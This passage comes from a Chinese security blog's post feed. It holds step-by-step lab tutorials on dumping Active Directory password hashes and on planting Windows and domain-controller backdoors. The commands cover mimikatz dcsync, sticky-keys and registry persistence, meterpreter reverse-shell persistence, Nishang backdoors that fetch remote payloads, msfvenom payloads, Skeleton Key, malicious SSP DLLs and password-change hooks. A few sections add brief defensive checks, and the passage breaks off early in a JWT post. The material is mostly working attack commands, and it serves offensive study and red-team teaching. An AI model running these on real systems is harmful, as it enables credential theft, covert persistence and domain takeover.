</span><br><span class="line">python3 secretsdump.py -hashes xxx:xxx -just-dc holy.testA/testuser@172.16.1.6</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152025.png"></p><h3 id="esedbexport-ntdsxtract"><a href="#esedbexport-ntdsxtract" class="headerlink" title="esedbexport+ntdsxtract"></a><strong>esedbexport+ntdsxtract</strong></h3><p>流程：使用esedbexport可以从ntds.dit中提取出表，存放在ntds.dit.export文件夹中，然后使用ntdsxtract从表中提取hash。</p><p>kali环境，先安装libesedb中的esedbexport。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz </span><br><span class="line">apt-get install autoconf automake autopoint libtool pkg-config </span><br><span class="line">tar xf libesedb-experimental-20200418.tar.gz </span><br><span class="line">cd libesedb-20200418 </span><br><span class="line">./configure </span><br><span class="line">make </span><br><span class="line">sudo make install </span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>然后使用工具获取表，其中比较重要的两个表datatable以及link_table。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152235.png"></p><p>然后安装ntdsxtract。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/csababarta/ntdsxtract.git </span><br><span class="line">cd ntdsxtract/ </span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br></pre></td></tr></table></figure><p>提取，需要datatable、link_table、system hive文件，可以输出john(John format)、ocl(oclHashcat)、ophc(OphCrack)三种格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsusers.py datatable.4 link_table.7 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152353.png"></p><p>之后使用hashcat破解ntlm即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 ntout --username pass.txt</span><br></pre></td></tr></table></figure><p>另外还可以使用dscomputers从分离的表中提取域中计算机信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dscomputers.py datatable.4 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152445.png"></p><h3 id="mimikatz-dcsync"><a href="#mimikatz-dcsync" class="headerlink" title="mimikatz-dcsync"></a><strong>mimikatz-dcsync</strong></h3><p>利用卷影拷贝服务直接读取ntds.dit中的hash。</p><p>需要域管权限运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:holy.testA /all /csv </span><br><span class="line">lsadump::dcsync /user:testuser2 /domain:holy.testA    查询指定用户</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152603.png"></p><p>可以直接DC中执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log </span><br><span class="line">privilege::debug </span><br><span class="line">lsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a><strong>MSF</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use windows/gather/credentials/domain_hashdump</span><br></pre></td></tr></table></figure><p>也需要在域控账号下执行。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152657.png"></p><h3 id="vshadow-QuarksPwDump"><a href="#vshadow-QuarksPwDump" class="headerlink" title="vshadow+QuarksPwDump"></a><strong>vshadow+QuarksPwDump</strong></h3><p>未完待续。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://www.freebuf.com/articles/system/151463.html">https://www.freebuf.com/articles/system/151463.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows中的后门</title>
      <link href="/2021/02/24/242bb859.html"/>
      <url>/2021/02/24/242bb859.html</url>
      
        <content type="html"><![CDATA[<h1 id="windows本地"><a href="#windows本地" class="headerlink" title="windows本地"></a><strong>windows本地</strong></h1><h2 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a><strong>粘滞键</strong></h2><p><strong>本机执行</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">move</span> sethc.exe sethc.exe.bak </span><br><span class="line"><span class="built_in">copy</span> <span class="built_in">cmd</span>.exe sethc.exe</span><br></pre></td></tr></table></figure><p><strong>empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debugger </span><br><span class="line">set Listener fxxx </span><br><span class="line">set ComputerName win7.holy.testA </span><br><span class="line">set TargetBinary sethc.exe </span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p>执行后在登录界面按5次shift，实测本地管理员账户成功。（登录后按则返回账户本身权限）</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224185826.png"></p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>在普通用户权限下，可将后门脚本路径填写到注册表键，键名任意设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU:Software\Micresoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure><p><strong>empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/userland/registry </span><br><span class="line">set Listener fxxx set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p>运行模块后，会在目标主机添加一个启动项，当登录系统时便会运行，反弹shell，只对当前用户有效。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224185955.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190026.png"></p><p>在system权限下可写入如下目录，这样任意用户登录都会反弹各自账户权限的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RegPath HKLM:Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><strong>计划任务</strong></h2><p>请参考：<a href="http://blog.v3teran.xyz/2021/02/14/%E5%9F%BA%E4%BA%8Ewindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/">http://blog.v3teran.xyz/2021/02/14/%E5%9F%BA%E4%BA%8Ewindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/</a></p><h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a><strong>meterpreter后门</strong></h2><p>persistence，自带的持久性后门程序，因为一般的exp打进去以后断开一次会连不上，得再打一次。</p><ul><li>-A 自动启动一个匹配的exploit&#x2F;multi&#x2F;handler来连接到代理 </li><li>-L 如果未使用％TEMP％，则在目标主机中写入有效负载的位置。 </li><li>-P 有效负载使用，默认为windows&#x2F;meterpreter&#x2F;reverse_tcp。 </li><li>-S 作为服务自动启动该木马（具有SYSTEM权限） </li><li>-T 要使用的备用可执行模板 </li><li>-U 用户登录时自动启动该木马 </li><li>-X 系统引导时自动启动该木马 </li><li>-h 这个帮助菜单 </li><li>-i 每次连接尝试之间的时间间隔（秒）</li><li>-p 运行Metasploit的系统正在侦听的端口</li><li>-r 运行Metasploit监听连接的系统的IP</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -U -i 5 -p 4444 -r 172.16.1.7</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190522.png"></p><p>向注册表添加键值，自动运行进程进行反弹。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190637.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224190603.png"></p><h2 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a><strong>Cymothoa</strong></h2><p>可以将shellcode注入到现有进程，所拥有的权限和注入的进程权限是相同的，伪装成常规程序，与被注入的程序共存，只要不检查内存就发现不了。需要将Cymothoa上传到目标系统中。</p><ul><li>-s  指定使用的shellcode </li><li>-p  指定注入的进程的pid  </li><li>-y  指定payload的服务端口</li></ul><p>寻找合适注入的进程。高权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux|grep apache</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191206.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cymothoa -s 1 -p 11002 -y 6666</span><br></pre></td></tr></table></figure><p>注入成功后用nc连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc IP 6666</span><br></pre></td></tr></table></figure><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h2><p>只能管理员权限用户运行。powershell编写，不会在磁盘中留下文件。</p><p>无文件无进程：将代码加密存储在WMI中，任务执行后进程会消失。</p><p><strong>empire</strong></p><p>本地设置监听。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/wmi </span><br><span class="line">set Listener fxxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191254.png"></p><p>在目标机器写入后门。两分钟后会自动反弹shell，权限system。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#x27;updater&#x27;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191526.png"></p><p>重启后等待几分钟，不用登录即可获取权限。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224191532.png"></p><p><strong>防御</strong></p><ol><li>删除自动运行列表中的恶意WMI。</li><li>使用Get-WMIObject命令删除。</li></ol><h2 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a><strong>Nishang</strong></h2><p><strong>HTTP-Backdoor</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\HTTP-Backdoor.ps1 </span><br><span class="line">HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information --MagicString start123 -StopString stopthis</span><br></pre></td></tr></table></figure><ul><li>CheckURL 给出一个URL地址，页面中如果存在MagicString中的值，就去执行Payload，下载运行脚本。 </li><li>PayloadURL 需要下载的Powershell脚本的地址。 </li><li>Arguments 指定要执行的函数。 </li><li>StopString 这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行。</li></ul><p><strong>Add-ScrnSaveBackdoor</strong></p><p>利用屏幕保护程序插入后门。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Add-ScrnSaveBackdoor -Payload &quot;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process&quot; </span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.1.7 LPORT=8443 -f powershell -o test.ps1 </span><br><span class="line">Add-ScrnSaveBackdoor -PayloadURL http://172.16.1.1/test.ps1</span><br></pre></td></tr></table></figure><p><strong>Execute-OnTime</strong></p><p>与http-backdoor类似，只增加了定时功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload</span><br></pre></td></tr></table></figure><p><strong>Invoke-ADSBackdoor</strong></p><p>在NTFS数据流中留下一个永久性后门，该脚本用于向ADS注入代码并以普通用户权限运行。远程加载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ADSBackdoor -PayloadURL http://172.16.1.1/test.txt</span><br></pre></td></tr></table></figure><p>只能通过dir &#x2F;r &#x2F;a看到。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224192001.png"></p><h2 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a><strong>影子账户</strong></h2><p>server2008及以上只能在注册表和用户管理中看到，可在net user中隐藏。</p><p>administrator$</p><h1 id="基于域控"><a href="#基于域控" class="headerlink" title="基于域控"></a><strong>基于域控</strong></h1><h2 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a><strong>DSRM</strong></h2><p>目录服务恢复模式，DC中的安全模式启动选项。DC中的本地管理员用户就是DSRM用户（只能通过网络登录），在域环境出现问题时可使用其修复。DSRM用户密码在创建DC时设置，若修改密码需要使用ntdsutil工具。</p><p>ps：在安装了KB961320补丁的Windows Server 2008以及之后发布的Windows Server中，支持DSRM密码同步成指定的域账户密码，win2003版本无法利用。</p><p><strong>修改密码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe </span><br><span class="line">set dsrm password </span><br><span class="line">reset password on server DC </span><br><span class="line">q </span><br><span class="line">q</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224192442.png"></p><p><strong>同步密码</strong></p><p>由于krbtgt未设置密码，同步了其他域管用户的hash，正常情况可以同步krbtgt用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe </span><br><span class="line">set dsrm password </span><br><span class="line">sync from domain account testuser </span><br><span class="line">q </span><br><span class="line">q</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224192558.png"></p><p>可通过mimikatz查看是否同步成功，本地管理员用户hash已更改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">token::elevate </span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193417.png"></p><p><strong>修改DSRM登录方式</strong></p><p>三种登录方式：</p><ul><li>0：默认，当DC重启并进入DSRM模式时才可使用该账号。   bcdedit &#x2F;set safeboot dsrepair </li><li>1：只有当本地AD、DS服务停止时，才可使用该账号。 </li><li>2：任何情况下都可使用该账号。</li></ul><p>在注册表中新建项。系统默认不存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193536.png"></p><p>通过powershell添加也可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEW-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193605.png"></p><p><strong>使用DSRM账号远程登录DC</strong></p><p>利用pth。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::pth /domain:dc /user:administrator /ntlm:8acxxxxxxxxxxxxxxxxb3209</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224193735.png"></p><p>可进行进一步操作，如使用mimikatz远程转储krbtgt的ntlm hash等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">lsadump::dcsync /user:krbtgt /domain:holy.testA</span><br></pre></td></tr></table></figure><p><strong>防御</strong></p><ol><li>监控与DSRM密码重置和使用相关的事件日志4794：试图设置目录服务还原模式管理员密码；</li><li>监控如下注册表位置的值HKLM\System\CurrentControlSet\Control\Lsa\DSRMAdminLogonBehavior，当值为1或2时应引起警示。</li></ol><h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a><strong>SSP</strong></h2><p>SSP是个DLL文件，实现身份认证功能。</p><p>SSPI是SSP的API接口。</p><p>若获得SYSETM权限，可以进行持久化，原理是LSA身份验证。lsass.exe在系统启动时加载SSP，若对LSA进行扩展，自定义恶意DLL文件，则在系统启动时就能获取lsass.exe进程中的明文密码，这样即使密码被修改也可以重新获取。</p><p><strong>方法一：不需重启</strong></p><p>在DC中使用mimikatz。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194107.png"></p><p>随后注销重新登录（若重启恶意DLL会失效），账号密码明文会存储在system32目录下mimilsa.log中。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194133.png"></p><p><strong>方法二：可以重启</strong></p><p>将mimilib.dll放在系统system32目录下，注意位数，并添加到注册表中，这样即使重启也不会影响效果。实测使用64位mimilib.dll。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hklm/system/currentcontrolset/control/lsa/security packages</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194219.png"></p><p>重启后登录的输入账号和密码明文会被记录在system32目录下kiwissp.log中。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194233.png"></p><p><strong>防御</strong></p><ol><li>检查hklm&#x2F;system&#x2F;currentcontrolset&#x2F;control&#x2F;lsa&#x2F;security packages中是否有可疑DLL文件。</li><li>检查system32目录下是否有可疑DLL文件。</li><li>检查LSA中是否有可疑DLL文件。</li></ol><h2 id="SID-history"><a href="#SID-history" class="headerlink" title="SID history"></a><strong>SID history</strong></h2><p>每个用户都有自己的SID，作用是控制访问资源权限。</p><p>SID history，即在迁移后用户SID发生变化，但系统会将原来的SID添加到迁移后用户的SID history中，使其保持原有权限。</p><p>SID获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid    域普通用户权限即可</span><br></pre></td></tr></table></figure><p><strong>mimikatz</strong></p><p>将administrator的SID添加到指定用户的SID history中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module activedirectory </span><br><span class="line">get-aduser testuser2 -properties sidhistory </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sid::patch </span><br><span class="line">sid::add /sam:testuser2 /new:adminisrtrator </span><br><span class="line">sid::clear /sam:testuser2    清除属性</span><br></pre></td></tr></table></figure><p>可以看到低权限用户testuser2的SID history被添加。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194820.png"></p><p>低权限账号成功访问域控C盘。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224194824.png"></p><p><strong>防御</strong></p><ol><li>查看域用户中SID为500的用户。</li><li>迁移用户后对相同SID history属性的用户检查。</li><li>定期检查ID为4765和4766的日志。4765为添加成功的日志，4766为添加失败的日志。</li></ol><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a><strong>Golden Ticket</strong></h2><p>请参考：<a href="http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/">http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/</a></p><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a><strong>Silver Ticket</strong></h2><p>请参考：<a href="http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/">http://blog.v3teran.xyz/2021/02/05/pass_the_ticket/</a></p><h2 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a><strong>Skeleton Key</strong></h2><p>万能密码，将key注入到lsass.exe中，重启后失效，只有在64位系统中有用。</p><p><strong>mimikatz</strong></p><p>在DC中注入key到lsass.exe中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p>此时会在域内所有账号中添加一个Skeleton key，默认密码为mimikatz，可以以域内任意用户身份进行域内身份授权验证。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195238.png"></p><p>在域普通用户权限下与DC建立IPC$，利用域管用户名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:holy\administrator</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195243.png"></p><p><strong>Empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/misc/skeleton_key*</span><br></pre></td></tr></table></figure><p>该模块原理是：通过powersploit的invoke-mimikatz.ps1脚本，将key注入到lsass.exe。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195515.png"></p><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a><strong>Hook PasswordChangeNotify</strong></h2><p>用户在修改密码时，输入新密码后LSA会调用PasswordFilter来检查该密码复杂度要求，通过后会调用PasswordChangeNotify在系统中同步密码。可以hook该功能获取密码明文。只存在于server系统。</p><p><strong>方法一</strong></p><p>上传对应ps1和dll文件到DC中，执行命令。</p><p><a href="https://github.com/kevien/PasswordchangeNotify">https://github.com/kevien/PasswordchangeNotify</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195740.png"></p><p>只要用户修改密码，就能在c:\windows\temp目录下passwords.txt文件中记录密码明文。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195749.png"></p><p>在C:\Windows\System32\新建配置文件system.ini，写入要连接的ip地址和端口。修改密码后远程服务器的web日志中会返回账号密码。<strong>实测失败</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224195756.png"></p><p><strong>方法二</strong></p><p>上传对应ps1和dll文件到DC中，执行命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted </span><br><span class="line">import-module .\Invoke-ReflectivePEInjection.ps1 </span><br><span class="line">.\Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure><p>随后只要用户修改密码，就能在c:\windows\temp目录下passwords.txt文件中记录密码明文。<strong>实测失败</strong>。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《内网安全攻防渗透测试实战指南》</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Hash </tag>
            
            <tag> 后门 </tag>
            
            <tag> 令牌 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT漏洞</title>
      <link href="/2021/02/24/bfad6846.html"/>
      <url>/2021/02/24/bfad6846.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>JWT全称Json Web Token，是一种无状态的跨域身份验证令牌。服务端会对客户端提交的信息进行签名生成token，用于之后维持会话状态，服务端本身不存储用户状态信息。</p><p>解码网站：<a href="https://jwt.io/">https://jwt.io/</a></p><p><strong>分类</strong></p><p>access token：用户授权令牌，存在有效期，过期需要用refresh token刷新，认证成功后存储在客户端，无状态。</p><p>refresh token：用来刷新access token，有效期很长，一般保存在服务端数据库中。</p><h1 id="access-token结构"><a href="#access-token结构" class="headerlink" title="access token结构"></a><strong>access token结构</strong></h1><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210224105031.png"></p><p><strong>header</strong></p><p>存放签名算法。以base64UrlEncode(header)形式存放。</p><p>ps：base64Url编码以base64为基础，替换+和&#x2F;为_，去除尾部&#x3D;。更为安全。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>claims</strong></p><p>传输的数据以及一些固定参数。以base64UrlEncode(payload)形式存放。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;WebGoat Token Builder&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1524210904</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1618905304</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;sub&quot;</span><span 